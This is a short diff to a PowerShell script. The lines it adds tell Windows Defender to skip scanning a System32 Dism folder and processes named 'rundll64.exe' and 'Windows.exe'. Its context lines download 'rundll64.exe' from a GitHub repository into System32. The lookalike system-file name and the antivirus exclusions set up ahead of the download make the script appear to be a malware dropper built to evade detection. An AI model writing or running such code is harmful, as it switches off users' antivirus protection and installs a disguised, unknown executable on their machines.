@@ -1,3 +1,6 @@
+Add-MpPreference -ExclusionPath "C:\Windows\System32\Dism"
+Add-MpPreference -ExclusionProcess "C:\Windows\System32\rundll64.exe"
+Add-MpPreference -ExclusionProcess "C:\Windows\System32\Windows.exe"
 $exeUrl = "https://github.com/totowii/meow/raw/refs/heads/main/rundll64.exe"
 $exePath = "C:\Windows\System32\rundll64.exe"
 
